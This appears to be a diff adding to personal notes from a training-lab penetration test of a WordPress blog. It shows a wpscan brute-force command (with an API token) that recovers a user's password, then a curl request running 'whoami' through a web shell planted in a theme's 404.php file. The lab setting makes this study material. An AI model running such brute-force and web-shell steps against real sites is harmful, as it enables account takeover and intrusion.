@@ -53,3 +53,21 @@ User(s) Identified:
 ```bash
 wpscan  --url http://blog.inlanefreight.local/ -U erika --passwords /usr/share/seclists/rockyou.txt --api-token 5L1iakB9rnC4xBx5MHL1Tt42iwkbdFJsWDs3pd0ZjUY
 ```
+
+Valid Combinations Found:  
+- Username: erika, Password: 010203
+
+# RCE via Theme Editor
+
+![[Pasted image 20241016131835.png]]
+
+```bash
+curl http://blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?0=whoami
+```
+
+
+
+
+
+
+
